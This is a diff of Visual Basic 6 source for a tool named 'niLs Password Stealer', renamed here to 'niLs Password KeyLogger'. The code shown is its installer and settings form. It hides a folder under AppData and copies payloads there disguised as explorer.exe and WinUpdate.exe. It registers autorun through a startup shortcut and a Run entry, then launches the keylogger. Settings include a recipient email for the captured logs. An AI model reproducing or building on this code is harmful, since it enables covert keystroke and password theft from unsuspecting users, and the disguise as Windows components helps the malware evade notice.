@@ -3,16 +3,14 @@ Begin VB.Form Form1
    Appearance      =   0  'Flat
    BackColor       =   &H00000000&
    BorderStyle     =   0  'None
-   Caption         =   "niLs Password Stealer"
-   ClientHeight    =   5595
+   Caption         =   "niLs Password KeyLogger"
+   ClientHeight    =   5625
    ClientLeft      =   0
    ClientTop       =   0
    ClientWidth     =   6150
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
-   MaxButton       =   0   'False
-   MinButton       =   0   'False
-   ScaleHeight     =   5595
+   ScaleHeight     =   5625
    ScaleWidth      =   6150
    StartUpPosition =   2  'CenterScreen
    Begin VB.CommandButton cmdInstall 
@@ -30,22 +28,43 @@ Begin VB.Form Form1
       Appearance      =   0  'Flat
       BackColor       =   &H80000005&
       ForeColor       =   &H80000008&
-      Height          =   1695
+      Height          =   1935
       Left            =   360
       TabIndex        =   34
-      Top             =   2040
+      Top             =   1560
       Visible         =   0   'False
       Width           =   5415
+      Begin VB.Label Label16 
+         Alignment       =   2  'Center
+         Appearance      =   0  'Flat
+         BackColor       =   &H80000005&
+         Caption         =   "Special Thanks to Marathi cyber Army"
+         BeginProperty Font 
+            Name            =   "Arial"
+            Size            =   8.25
+            Charset         =   0
+            Weight          =   400
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H00404040&
+         Height          =   255
+         Left            =   0
+         TabIndex        =   39
+         Top             =   1560
+         Width           =   5415
+      End
       Begin VB.Label Label15 
          Alignment       =   2  'Center
          Appearance      =   0  'Flat
          BackColor       =   &H80000005&
-         Caption         =   "itsniL@ymail.com"
+         Caption         =   "itsniL123@gmail.com"
          BeginProperty Font 
-            Name            =   "Times New Roman"
+            Name            =   "Arial"
             Size            =   11.25
             Charset         =   0
-            Weight          =   700
+            Weight          =   400
             Underline       =   0   'False
             Italic          =   0   'False
             Strikethrough   =   0   'False
@@ -54,7 +73,7 @@ Begin VB.Form Form1
          Height          =   255
          Left            =   0
          TabIndex        =   37
-         Top             =   1320
+         Top             =   1200
          Width           =   5415
       End
       Begin VB.Label Label14 
@@ -77,7 +96,7 @@ Begin VB.Form Form1
          Height          =   255
          Left            =   1080
          TabIndex        =   36
-         Top             =   960
+         Top             =   840
          Width           =   3255
       End
       Begin VB.Label Label13 
@@ -86,7 +105,7 @@ Begin VB.Form Form1
          BackColor       =   &H80000005&
          Caption         =   "Visit www.TheniLsProjects.blogspot.com"
          BeginProperty Font 
-            Name            =   "Tahoma"
+            Name            =   "Arial"
             Size            =   14.25
             Charset         =   0
             Weight          =   700
@@ -130,12 +149,41 @@ Begin VB.Form Form1
       BackColor       =   &H00000000&
       Caption         =   "Titles Picker:"
       ForeColor       =   &H00C0C0C0&
-      Height          =   3855
+      Height          =   4215
       Left            =   120
       TabIndex        =   14
       Top             =   5640
       Visible         =   0   'False
       Width           =   5895
+      Begin VB.CommandButton cmdUpdate 
+         BackColor       =   &H00C0C0C0&
+         Caption         =   "Update"
+         Height          =   255
+         Left            =   4920
+         Style           =   1  'Graphical
+         TabIndex        =   41
+         Top             =   840
+         Width           =   735
+      End
+      Begin VB.TextBox txtUpdate 
+         Appearance      =   0  'Flat
+         BackColor       =   &H00FFFFFF&
+         BeginProperty Font 
+            Name            =   "Arial"
+            Size            =   8.25
+            Charset         =   0
+            Weight          =   400
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H00000000&
+         Height          =   225
+         Left            =   120
+         TabIndex        =   40
+         Top             =   900
+         Width           =   4815
+      End
       Begin VB.CommandButton cmdSaveTitles 
          BackColor       =   &H00E0E0E0&
          Caption         =   "Save Titles"
@@ -143,7 +191,7 @@ Begin VB.Form Form1
          Left            =   2040
          Style           =   1  'Graphical
          TabIndex        =   20
-         Top             =   3360
+         Top             =   3720
          Width           =   1695
       End
       Begin VB.CommandButton cmdRemoveTitle 
@@ -153,7 +201,7 @@ Begin VB.Form Form1
          Left            =   2640
          Style           =   1  'Graphical
          TabIndex        =   19
-         Top             =   2280
+         Top             =   2640
          Width           =   615
       End
       Begin VB.CommandButton cmdAddTitles 
@@ -163,7 +211,7 @@ Begin VB.Form Form1
          Left            =   2640
          Style           =   1  'Graphical
          TabIndex        =   18
-         Top             =   1200
+         Top             =   1440
          Width           =   615
       End
       Begin VB.CommandButton cmdScanTitles 
@@ -173,34 +221,34 @@ Begin VB.Form Form1
          Left            =   4440
          Style           =   1  'Graphical
          TabIndex        =   17
-         Top             =   3000
+         Top             =   3360
          Width           =   1095
       End
       Begin VB.Timer Timer1 
          Enabled         =   0   'False
          Interval        =   1000
-         Left            =   2280
-         Top             =   840
+         Left            =   5400
+         Top             =   240
       End
       Begin VB.ListBox List2 
          Appearance      =   0  'Flat
          ForeColor       =   &H00404040&
-         Height          =   2175
+         Height          =   2370
          ItemData        =   "Form1.frx":57E2
          Left            =   3240
          List            =   "Form1.frx":57E4
          MultiSelect     =   2  'Extended
          TabIndex        =   16
-         Top             =   960
+         Top             =   1200
          Width           =   2535
       End
       Begin VB.ListBox List1 
          Appearance      =   0  'Flat
          BackColor       =   &H00E0E0E0&
-         Height          =   2175
+         Height          =   2370
          Left            =   120
          TabIndex        =   15
-         Top             =   960
+         Top             =   1200
          Width           =   2535
       End
       Begin VB.Label Label12 
@@ -296,6 +344,7 @@ Begin VB.Form Form1
          Height          =   285
          Left            =   1800
          TabIndex        =   12
+         ToolTipText     =   "Click to Explore."
          Top             =   600
          Width           =   2895
       End
@@ -305,6 +354,7 @@ Begin VB.Form Form1
          Left            =   1800
          MaxLength       =   25
          TabIndex        =   9
+         ToolTipText     =   "This will help you to identify this PC uniquely."
          Top             =   240
          Width           =   2895
       End
@@ -335,7 +385,7 @@ Begin VB.Form Form1
          Height          =   255
          Left            =   120
          TabIndex        =   8
-         ToolTipText     =   "Double Click to Hide this Folder."
+         ToolTipText     =   "Double Click to Hide this Folder. Single Click to unHide"
          Top             =   600
          Width           =   1695
       End
@@ -508,7 +558,7 @@ Begin VB.Form Form1
       Appearance      =   0  'Flat
       BackColor       =   &H00404040&
       BorderStyle     =   1  'Fixed Single
-      Caption         =   "niLs Passwords Stealer"
+      Caption         =   "niLs Password KeyLogger"
       BeginProperty Font 
          Name            =   "Arial"
          Size            =   15.75
@@ -580,7 +630,6 @@ Frame1.Enabled = False
 txtRecEmail = "none"
 Else
 Frame1.Enabled = True
-Call LoadSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
 End If
 End Sub
 
@@ -600,13 +649,26 @@ Private Sub cmdInstall_Click()
 Call InstallNPS
 End Sub
 
+Private Sub cmdUpdate_Click()
+List1.RemoveItem List1.ListIndex
+List1.AddItem txtUpdate, List1.ListIndex + 1
+End Sub
+
 Private Sub Form_Load()
-If Command = "/install" Then Call InstallNPS: End
-If Command = "/local" Then
-Call LoadSetting(App.Path & "\Files\files.cab"): chkAuto.Enabled = False: Label9.Caption = Label9.Caption & " - Settings"
+If Command = "/install" Then Call InstallNPS: Exit Sub: End
+
+If Command = "/default" Then
+    Call LoadSetting(App.Path & "\Files\files.cab"): chkAuto.Enabled = False: Label9.Caption = "nKLG - Default Settings"
 Else
-Call LoadSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
-Call LoadAutoRunSetting
+    If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe") <> "" Then
+    Call LoadSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
+    Call LoadAutoRunSetting
+    Else
+    Dim ans As String
+    ans = MsgBox("niLs Password Keylogger not installed. Do you want to install now?", vbYesNo, "Install?")
+    If ans = vbYes Then Call InstallNPS
+    End
+    End If
 End If
 End Sub
 Private Sub LoadSetting(ByVal settingFile As String)
@@ -624,6 +686,7 @@ txtSePWD = SePWD
 txtReTime = ReTime
 txtPCDec = PCDec
 txtLogPWD = LogPWD
+If RecEmail = "none" Then Check1.Value = vbUnchecked: Frame1.Enabled = False
 
 errhand:
 If err.Number <> 0 Then MsgBox "Error during Load!"
@@ -670,11 +733,11 @@ End If
 If optReg.Value = True Then
     Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
     If m_IgnoreEvents Then Exit Sub
-    SetRunAtStartup "Windows Explorer", AppDataPath & "System", True
+    SetRunAtStartup "explorer", AppDataPath & "System", True
 Else
     Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, True
     If m_IgnoreEvents Then Exit Sub
-    SetRunAtStartup "Windows Explorer", AppDataPath & "System", False
+    SetRunAtStartup "explorer", AppDataPath & "System", False
 End If
 End Sub
 
@@ -712,7 +775,7 @@ List1.Clear
 On Error Resume Next
 Dim t1, t2, t3, t4, t5 As String
 If chkAuto.Enabled = False Then
-Open (App.Path & "\Files\tafr.INL") For Input As #1
+Open (App.Path & "\Files\main.exe") For Input As #1
 Else
 Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Input As #1
 End If
@@ -763,7 +826,7 @@ t5 = Left(List1.Text, 25)
 
 On Error Resume Next
 If chkAuto.Enabled = False Then
-Open (App.Path & "\Files\tafr.INL") For Output As #1
+Open (App.Path & "\Files\main.exe") For Output As #1
 Else
 Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Output As #1
 End If
@@ -794,10 +857,10 @@ On Error GoTo errhand
 If FolderExists(GetSpecialFolderA(CSIDL_APPDATA) & "System") = False Then MkDir GetSpecialFolderA(CSIDL_APPDATA) & "System"
 Call HideThisFolder(GetSpecialFolderA(CSIDL_APPDATA) & "System", True)
 
-FileCopy App.Path & "\Files\NILS.ISS", GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe"   'explorer.exe
+FileCopy App.Path & "\Files\msex.text", GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe"   'explorer.exe
 FileCopy App.Path & "\Files\AS4T.CVF", GetSpecialFolderA(CSIDL_APPDATA) & "System\WinUpdate.exe"     'winUpdate.exe
 FileCopy App.Path & "\Files\files.CAB", GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp"
-FileCopy App.Path & "\Files\tafr.INL", GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP"
+FileCopy App.Path & "\Files\main.exe", GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP"
 
 'Set Autorun options
 Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
@@ -807,9 +870,19 @@ SetRunAtStartup "Windows Explorer", AppDataPath & "System", True
 LoadSetting (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
 LoadAutoRunSetting
 
+'Start Keylogger:
+Shell GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe", vbNormalFocus
+
 errhand:
-If err.Number = 0 Then MsgBox "Installed Successfully!", vbInformation
-If err.Number = 76 Then MsgBox "Installation Files not Found!", vbCritical: End
+If err.Number = 0 Then
+    MsgBox "Installed Successfully!", vbInformation
+ElseIf err.Number = 76 Then
+    MsgBox "Installation Files not Found!", vbCritical: End
+ElseIf err.Number = 70 Then
+    MsgBox "Keylogger is active! Disable Autorun and logoff to re-install.", vbCritical
+Else
+    MsgBox err.Description: End
+End If
 End Sub
 
 
@@ -865,6 +938,10 @@ End Sub
 Private Sub Label9_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
 Label9.BackColor = vbBlue
 
+End Sub
+
+Private Sub List1_Click()
+txtUpdate = List1.Text
 End Sub
 
 Private Sub Timer1_Timer()
